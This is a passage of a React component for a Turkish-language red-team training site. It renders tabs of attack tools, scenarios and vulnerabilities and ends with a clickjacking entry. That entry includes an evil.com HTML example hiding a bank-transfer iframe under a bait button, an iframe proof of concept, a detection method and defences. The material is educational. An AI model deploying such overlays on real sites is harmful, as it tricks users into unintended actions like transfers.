      "Null origin nasıl bypass vektörü haline gelir?",
    ],
  },
  {
    id: "clickjacking",
    title: "Clickjacking",
    severity: "Orta", sevColor: "amber",
    category: "Web / UI", owasp: "A05:2021",
    brief: "Şeffaf iframe ile hedef site kullanıcı arayüzü üzerine bindirilir — kurban görünmez düğmeye tıklar.",
    howWorks: `evil.com'daki HTML:
<style>
  iframe { opacity: 0.1; position: absolute; top: 0; left: 0; }
  button { position: absolute; top: 200px; left: 100px; }
</style>
<iframe src="https://bank.com/transfer?to=attacker&amount=1000"></iframe>
<button>Ücretsiz iPhone Kazan!</button>

Kurban "Ücretsiz iPhone Kazan!"a tıklıyor
Gerçekte: banka transfer onay butonuna tıklıyor

Tespit:
DevTools Network → bank.com isteği → Response Header'lar
X-Frame-Options yoksa ve CSP frame-ancestors yoksa → zafiyet!`,
    payloads: [
      { type: "Basic PoC", p: "<iframe src='https://TARGET/' style='opacity:0.1; width:500px; height:500px;'></iframe>", d: "opacity:0.1 ile iframe'i görerek hizala" },
      { type: "Tespit", p: "X-Frame-Options: DENY yoksa + CSP frame-ancestors yoksa → zafiyet", d: "Header kontrolü" },
    ],
    tool: "Burp → Engagement Tools → Clickjacking PoC", toolSlug: "burpsuite",
    defense: [
      "X-Frame-Options: DENY (hiçbir frame yok) veya SAMEORIGIN",
      "CSP: frame-ancestors 'none' — daha modern ve esnek",
      "SameSite=Strict cookie (ek katman — her senaryoyu kapatmaz)",
    ],
    interview: [
      "X-Frame-Options ile CSP frame-ancestors farkı nedir?",
      "Clickjacking ile CSRF farkı nedir?",
      "JS frame-busting (framebusting) neden yeterli değil?",
    ],
  },
];

const sevBadge: Record<string, string> = {
  red:    "text-red-400 bg-red-500/10 border-red-500/25",
  orange: "text-orange-400 bg-orange-500/10 border-orange-500/25",
  amber:  "text-amber-400 bg-amber-500/10 border-amber-500/25",
};

// ─── Bileşen ─────────────────────────────────────────────────────────
export default function RedTeamPage() {
  const [openCats,        setOpenCats]        = useState<Record<string, boolean>>({});
  const [openScenarioCat, setOpenScenarioCat] = useState<string | null>(null);
  const [openScenario,    setOpenScenario]    = useState<string | null>(null);
  const [openVuln,        setOpenVuln]        = useState<string | null>(null);
  const [tab, setTab] = useState<"araclar" | "senaryolar" | "zafiyetler">("araclar");

  const toggleCat = (id: string) => setOpenCats((s) => ({ ...s, [id]: !s[id] }));

  return (
    <div className="p-6 max-w-4xl mx-auto">
      <div className="flex items-center gap-3 mb-2">
        <Shield className="w-7 h-7 text-red-400" />
        <h1 className="text-2xl font-bold text-terminal-white">Red Team</h1>
      </div>
      <p className="text-terminal-comment mb-6 ml-10">
        Ofansif güvenlik araçlarını ve tekniklerini temelden ileri seviyeye öğren.
        <Link href="/metodoloji" className="ml-2 text-xs text-fuchsia-400/70 hover:text-fuchsia-300 transition-colors">
          ← Metodoloji omurgası
        </Link>
      </p>

      {/* Sekmeler */}
      <div className="flex gap-1 mb-6 border-b border-surface-3">
        {([
          { id: "araclar",    icon: Shield,    label: "Araçlar" },
          { id: "senaryolar", icon: GitBranch, label: "Saldırı Senaryoları" },
          { id: "zafiyetler", icon: Bug,       label: "Popüler Zafiyetler" },
        ] as const).map(({ id, icon: Icon, label }) => (
          <button
            key={id}
            onClick={() => setTab(id)}
            className={cn(
              "flex items-center gap-1.5 px-4 py-2 text-sm font-semibold transition-colors border-b-2 -mb-px",
              tab === id
                ? "border-red-500 text-red-300"
                : "border-transparent text-terminal-comment hover:text-terminal-white"
            )}
          >
            <Icon className="w-3.5 h-3.5" />
            {label}
          </button>
        ))}
      </div>

      {/* ── ARAÇLAR ── */}
      {tab === "araclar" && (
        <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-3">
          {toolCategories.map((cat) => {
            const isOpen = openCats[cat.id] ?? false;
            return (
              <div
                key={cat.id}
                className={cn(
                  "border rounded-xl overflow-hidden transition-all duration-200",
                  isOpen
                    ? "border-red-500/40 shadow-[0_0_24px_rgba(239,68,68,0.08)] sm:col-span-2 lg:col-span-3"
                    : "border-surface-3 hover:border-red-500/30"
                )}
              >
                <button
                  onClick={() => toggleCat(cat.id)}
                  className={cn(
                    "w-full text-left px-4 py-3.5 transition-colors flex items-center gap-3",
                    isOpen ? "bg-red-500/5" : "hover:bg-surface-2"
                  )}
                >
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center gap-2 flex-wrap mb-0.5">
                      <span className="text-sm font-semibold text-terminal-white">{cat.category}</span>
                      <span className="text-xs font-mono text-red-400/70 bg-red-500/5 border border-red-500/15 px-1.5 py-0.5 rounded">
                        {cat.items.length} araç
                      </span>
                    </div>
                    <p className="text-xs text-terminal-comment">{cat.desc}</p>
                  </div>
                  {isOpen
                    ? <ChevronDown className="w-4 h-4 text-red-400 shrink-0" />
                    : <ChevronRight className="w-4 h-4 text-terminal-comment shrink-0" />}
                </button>

                {isOpen && (
                  <div className="border-t border-surface-3 grid sm:grid-cols-2 lg:grid-cols-3 gap-2 p-3 bg-surface-1/40">
                    {cat.items.map((tool) => (
                      <Link key={tool.slug} href={`/red-team/${tool.slug}`} className="group">
                        <div className="h-full rounded-lg border border-surface-3 hover:border-red-500/40 bg-surface-1 p-3 transition-all flex flex-col gap-1">
                          <div className="flex items-start justify-between gap-1">
                            <span className="text-xs font-semibold text-terminal-white group-hover:text-red-300 transition-colors leading-snug">
                              {tool.title}
                            </span>
                            <ArrowRight className="w-3 h-3 text-terminal-comment group-hover:text-red-400 group-hover:translate-x-0.5 transition-all shrink-0 mt-0.5" />
                          </div>
                          <p className="text-xs text-terminal-comment leading-relaxed flex-1">{tool.desc}</p>
                          <span className="text-xs font-mono text-red-400/60 bg-red-500/5 border border-red-500/10 px-1.5 py-0.5 rounded w-fit mt-1">
                            {tool.level}
                          </span>
                        </div>
                      </Link>
                    ))}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      )}

      {/* ── SALDIRI SENARYOLARI ── */}
      {tab === "senaryolar" && (
        <div>
          <p className="text-xs text-terminal-comment mb-5">
            Tek başına araç bilmek yetmez —{" "}
            <span className="text-red-300">zincirleyen düşünce biçimi</span> seni senior yapan şeydir.
            Tüm senaryolar yalnızca yetkili pentest veya izole lab{" "}
            <span className="text-cyan-400">(HTB / THM / CTF)</span> içindir.
          </p>

          <div className="grid sm:grid-cols-2 gap-3">
            {scenarioCategories.map((cat) => {
              const isCatOpen = openScenarioCat === cat.id;
              return (
                <div
                  key={cat.id}
                  className={cn(
                    "border rounded-xl overflow-hidden transition-all duration-200",
                    isCatOpen
                      ? "border-red-500/40 shadow-[0_0_24px_rgba(239,68,68,0.08)] sm:col-span-2"
                      : "border-surface-3 hover:border-red-500/30"
                  )}
                >
                  {/* Kategori başlığı */}
                  <button
                    onClick={() => {
                      setOpenScenarioCat(isCatOpen ? null : cat.id);
                      setOpenScenario(null);
                    }}
                    className={cn(
                      "w-full text-left px-4 py-3.5 transition-colors flex items-center gap-3",
                      isCatOpen ? "bg-red-500/5" : "hover:bg-surface-2"
                    )}
                  >
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 flex-wrap mb-0.5">
                        <span className="text-sm font-semibold text-terminal-white">{cat.label}</span>
                        <span className="text-xs font-mono text-red-400/70 bg-red-500/5 border border-red-500/15 px-1.5 py-0.5 rounded">
                          {cat.scenarios.length} senaryo
                        </span>
                      </div>
                      <p className="text-xs text-terminal-comment">
                        {cat.scenarios.map((s) => s.difficulty).join(" · ")}
                      </p>
                    </div>
                    {isCatOpen
                      ? <ChevronDown className="w-4 h-4 text-red-400 shrink-0" />
                      : <ChevronRight className="w-4 h-4 text-terminal-comment shrink-0" />}
                  </button>

                  {/* Senaryolar */}
                  {isCatOpen && (
                    <div className="border-t border-surface-3 p-3 space-y-2 bg-surface-1/30">
                      {cat.scenarios.map((s) => {
                        const isOpen = openScenario === s.id;
                        return (
                          <div key={s.id} className={cn("border rounded-lg overflow-hidden transition-all",
                            isOpen ? "border-red-500/30" : "border-surface-3")}>
                            <button
                              onClick={() => setOpenScenario(isOpen ? null : s.id)}
                              className={cn("w-full flex items-start gap-3 px-4 py-3 text-left transition-colors",
                                isOpen ? "bg-red-500/5" : "hover:bg-surface-2")}
                            >
                              <Crosshair className={cn("w-4 h-4 shrink-0 mt-0.5", isOpen ? "text-red-400" : "text-terminal-comment")} />
                              <div className="flex-1 min-w-0">
                                <div className="flex items-center gap-2 flex-wrap mb-0.5">
                                  <span className="text-sm font-semibold text-terminal-white leading-snug">{s.title}</span>
                                  <span className={cn("text-xs font-mono px-1.5 py-0.5 rounded border", levelColor[s.diffColor])}>
                                    {s.difficulty}
                                  </span>
                                </div>
                                <p className="text-xs text-terminal-comment">{s.target}</p>
                              </div>
                              {isOpen
                                ? <ChevronDown className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                                : <ChevronRight className="w-4 h-4 text-terminal-comment shrink-0 mt-0.5" />}
                            </button>

                            {isOpen && (
                              <div className="border-t border-surface-3 p-4 space-y-3 bg-surface-1/50">
                                <p className="text-xs text-terminal-comment leading-relaxed">{s.desc}</p>
                                <div className="space-y-2">
                                  {s.chain.map((c, i) => (
                                    <div key={c.step} className="flex gap-3">
                                      <div className="flex flex-col items-center">
                                        <div className="w-6 h-6 rounded-full bg-red-500/10 border border-red-500/30 flex items-center justify-center text-xs font-mono text-red-400 shrink-0">
                                          {c.step}
                                        </div>
                                        {i < s.chain.length - 1 && <div className="w-px flex-1 bg-red-500/10 mt-1" />}
                                      </div>
                                      <div className="pb-3 min-w-0 flex-1">
                                        <div className="flex items-center gap-2 flex-wrap mb-0.5">
                                          <span className="text-sm font-semibold text-terminal-white">{c.label}</span>
                                          <Link
                                            href={c.href}
                                            className="text-xs font-mono text-red-400 bg-red-500/5 border border-red-500/20 px-1.5 py-0.5 rounded hover:bg-red-500/15 transition-colors"
                                          >
                                            {c.tool} →
                                          </Link>
                                        </div>
                                        <p className="text-xs text-terminal-comment font-mono leading-relaxed">{c.detail}</p>
                                      </div>
                                    </div>
                                  ))}
                                </div>
                                <div className="rounded-md border border-blue-500/20 bg-blue-500/5 px-3 py-2">
                                  <p className="text-xs text-blue-300/80">
                                    <span className="font-semibold text-blue-300">Savunma: </span>{s.defense}
                                  </p>
                                </div>
                              </div>
                            )}
                          </div>
                        );
                      })}
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* ── POPÜLER ZAFİYETLER ── */}
      {tab === "zafiyetler" && (
        <div>
          <p className="text-xs text-terminal-comment mb-5">
            Mülakatların ve bug bounty'nin omurgası —{" "}
            <span className="text-red-300">her zafiyeti teori + payload + savunma</span> üçlüsüyle öğren.
            Tüm içerik yalnızca yetkili pentest veya izole lab <span className="text-cyan-400">(HTB / THM / CTF)</span> içindir.
          </p>
          <div className="grid sm:grid-cols-2 gap-3">
            {vulnList.map((v) => {
              const isOpen = openVuln === v.id;
              return (
                <div
                  key={v.id}
                  className={cn(
                    "border rounded-xl overflow-hidden transition-all duration-200",
                    isOpen
                      ? "border-red-500/40 shadow-[0_0_20px_rgba(239,68,68,0.07)] sm:col-span-2"
                      : "border-surface-3 hover:border-red-500/25"
                  )}
                >
                  {/* Card header */}
                  <button
                    onClick={() => setOpenVuln(isOpen ? null : v.id)}
                    className={cn(
                      "w-full flex items-start gap-3 px-4 py-3.5 text-left transition-colors",
                      isOpen ? "bg-red-500/5" : "hover:bg-surface-2"
                    )}
                  >
                    <div className="flex-1 min-w-0">
                      <div className="flex items-center gap-2 flex-wrap mb-1">
                        <span className="text-sm font-semibold text-terminal-white">{v.title}</span>
                        <span className={cn("text-xs font-mono px-1.5 py-0.5 rounded border", sevBadge[v.sevColor])}>{v.severity}</span>
                        <span className="text-xs font-mono text-terminal-comment/60 bg-surface-2 border border-surface-3 px-1.5 py-0.5 rounded">{v.owasp}</span>
                        <span className="text-xs text-terminal-comment/50">{v.category}</span>
                      </div>
                      <p className="text-xs text-terminal-comment leading-relaxed">{v.brief}</p>
                    </div>
                    {isOpen
                      ? <ChevronDown className="w-4 h-4 text-red-400 shrink-0 mt-0.5" />
                      : <ChevronRight className="w-4 h-4 text-terminal-comment shrink-0 mt-0.5" />}
                  </button>

                  {/* Expanded content */}
                  {isOpen && (
                    <div className="border-t border-surface-3">

                      {/* Types grid */}
                      {v.types && (
                        <div className="p-4 border-b border-surface-3/50">
                          <p className="text-xs font-semibold text-terminal-white mb-3">Zafiyet Türleri</p>
                          <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-2">
                            {v.types.map((t) => (
                              <div key={t.name} className="rounded-lg border border-surface-3 bg-surface-1 p-2.5">
                                <p className="text-xs font-semibold text-red-300 mb-1">{t.name}</p>
                                <p className="text-xs text-terminal-comment leading-relaxed">{t.desc}</p>
                              </div>
                            ))}
                          </div>
                        </div>
                      )}

                      {/* Detection steps */}
                      {v.detectionSteps && (
                        <div className="p-4 border-b border-surface-3/50">
                          <p className="text-xs font-semibold text-terminal-white mb-2">Tespit Adımları</p>
                          <div className="space-y-1.5">
                            {v.detectionSteps.map((s, i) => (
                              <div key={i} className="flex gap-2.5 text-xs">
                                <span className="text-red-400 font-mono shrink-0 w-4">{i + 1}.</span>
                                <span className="text-terminal-comment leading-relaxed">{s}</span>
                              </div>
                            ))}
                          </div>
                        </div>
                      )}

                      {/* How it works */}
                      <div className="p-4 border-b border-surface-3/50">
                        <p className="text-xs font-semibold text-terminal-white mb-2">Nasıl Çalışır?</p>
                        <pre className="text-xs text-cyan-400 font-mono bg-surface-2 rounded-lg p-3 whitespace-pre-wrap leading-relaxed overflow-x-auto">{v.howWorks}</pre>
                      </div>

                      {/* Payloads */}
                      <div className="p-4 border-b border-surface-3/50">
                        <p className="text-xs font-semibold text-terminal-white mb-2">Test Payload'ları</p>
                        <div className="grid sm:grid-cols-2 gap-2">
                          {v.payloads.map((pl, i) => (
                            <div key={i} className="rounded-lg border border-surface-3 bg-surface-1 p-2.5">
                              {pl.type && (
                                <span className="inline-block text-[10px] font-mono text-red-400/70 bg-red-500/10 border border-red-500/20 rounded px-1.5 py-0.5 mb-1.5">{pl.type}</span>
                              )}
                              <code className="text-xs font-mono text-green-400 block mb-1 break-all leading-relaxed">{pl.p}</code>
                              <p className="text-xs text-terminal-comment">{pl.d}</p>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Tool commands */}
                      {v.toolCmds && (
                        <div className="p-4 border-b border-surface-3/50">
                          <p className="text-xs font-semibold text-terminal-white mb-2">
                            {v.tool} Akışı
                          </p>
                          <div className="space-y-2">
                            {v.toolCmds.map((tc, i) => (
                              <div key={i} className="flex gap-2.5">
                                <span className="text-red-400 font-mono text-xs shrink-0 w-4 mt-0.5">{i + 1}.</span>
                                <div className="min-w-0">
                                  <code className="text-xs font-mono text-terminal-green block break-all">{tc.cmd}</code>
                                  <p className="text-xs text-terminal-comment mt-0.5">{tc.desc}</p>
                                </div>
                              </div>
                            ))}
                          </div>
                        </div>
                      )}

                      {/* Real world */}
                      {v.realWorld && (
                        <div className="px-4 pt-3 pb-0 border-b border-surface-3/50">
                          <p className="text-xs font-semibold text-terminal-white mb-1.5">Gerçek Dünya Örnekleri</p>
                          <p className="text-xs text-amber-400/80 leading-relaxed pb-3">{v.realWorld}</p>
                        </div>
                      )}

                      {/* Bottom: defense + interview side by side */}
                      <div className="grid sm:grid-cols-2 divide-y sm:divide-y-0 sm:divide-x divide-surface-3/50">
                        <div className="p-4">
                          <p className="text-xs font-semibold text-terminal-white mb-2">Savunma</p>
                          <ul className="space-y-1.5">
                            {v.defense.map((d, i) => (
                              <li key={i} className="flex gap-1.5 text-xs text-blue-300/80 leading-relaxed">
                                <span className="text-blue-400 shrink-0 mt-0.5">›</span>{d}
                              </li>
                            ))}
                          </ul>
                        </div>
                        <div className="p-4">
                          <p className="text-xs font-semibold text-terminal-white mb-2">Mülakat Soruları</p>
                          <ul className="space-y-1.5">
                            {v.interview.map((q, i) => (
                              <li key={i} className="flex gap-1.5 text-xs text-terminal-comment leading-relaxed">
                                <span className="text-red-400 shrink-0 mt-0.5">›</span>{q}
                              </li>
                            ))}
                          </ul>
                          <Link
                            href={`/red-team/${v.toolSlug}`}
                            className="mt-4 inline-flex items-center gap-1 text-xs text-red-400 hover:text-red-300 transition-colors"
                          >
                            {v.tool} ile pratik yap <ArrowRight className="w-3 h-3" />
                          </Link>
                        </div>
                      </div>

                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      )}
    </div>
  );
}
